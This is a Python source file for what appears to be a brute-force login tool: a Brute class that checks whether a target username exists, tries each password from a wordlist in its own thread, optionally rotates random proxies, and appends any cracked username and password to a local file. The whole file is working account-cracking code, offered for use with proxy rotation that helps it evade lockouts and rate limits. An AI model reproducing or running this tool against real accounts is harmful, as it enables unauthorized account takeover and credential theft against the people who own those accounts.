from threading import Thread
from lib.src.browser import Browser
from lib.src.const import session_data
from lib.src.password_manager import Pw
from lib.src.proxy_manager import Px
from lib.src.debug.debug import Debug
from lib.src.change_for_bool import change_for_bool
from time import sleep
from random import choice

class Brute:
	def __init__(self, username, wordlist, timeout = None, proxy = None, verbose = False):
		self._username = username
		self._password = wordlist
		self._timeout = timeout
		self.auth = False
		self.error = False
		self.cracked = None
		self.verbose = verbose
		self._proxy = proxy
	def attack(self, key):
		passwordL = Pw(self._password).password()[key].replace('\n', '')
		if self._proxy:
			proxyL = choice(Px(self._proxy).proxy()).replace('\n', '')
			res = Browser(username=self._username, password=passwordL, proxy=proxyL, verbose=self.verbose).login()
			self.auth = res['authenticated']
			self.error = res['error']
			self.cracked = res['passsword']
		else:
			res = Browser(username=self._username, password=passwordL, verbose=self.verbose).login()
			self.auth = res['authenticated']
			self.error = res['error']
			self.cracked = res['passsword']
	def start(self):
		Debug('[*] Starting', verbose=self.verbose)
		Debug('[*] Checking if the user exists...', verbose=self.verbose)
		Browser(username=self._username, password='').user_exist()
		for i in range(len(Pw(self._password).read())+1):
			sleep(self._timeout)
			Thread(target=self.attack, args=(i-1,), daemon=True).start()
			if self.error:
				break
			if self.auth:
				with open('informations.txt', 'a') as f:
						msg = f"""
---------------------------------
	Username: {self._username}
	Password: {self.cracked}
---------------------------------\n\n
						"""
						f.write(msg)
						Debug('[!] Wrote informations in informations.txt', verbose=self.verbose)
						break